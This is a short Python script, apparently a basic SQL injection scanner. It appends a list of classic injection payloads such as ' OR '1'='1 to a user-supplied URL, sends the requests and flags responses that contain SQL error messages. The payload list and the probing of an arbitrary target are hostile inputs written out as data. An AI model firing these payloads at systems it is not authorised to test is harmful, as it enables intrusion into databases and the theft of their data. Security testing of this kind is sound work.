import requests
from bs4 import BeautifulSoup

# SQL Injection payloads to test
payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1#", "' OR 'a'='a", "' OR 1=1 LIMIT 1--"]

def scan_sql_injection(url):
    print(f"[*] Scanning {url} for SQL Injection vulnerabilities...")
    
    # Check if URL has a parameter (?)
    if "?" in url:
        for payload in payloads:
            target_url = url + payload
            response = requests.get(target_url)
            
            # Detecting SQL error messages
            error_messages = ["error in your SQL syntax", "mysql_fetch", "You have an error in your SQL syntax", "sql syntax", "SQL error"]
            
            if any(error.lower() in response.text.lower() for error in error_messages):
                print(f"[!] SQL Injection vulnerability found at: {target_url}")
                return

    print("[✓] No SQL Injection vulnerabilities found.")

# Example target input
target_url = input("Enter the target URL (e.g., https://example.com/page?id=1): ")
scan_sql_injection(target_url)
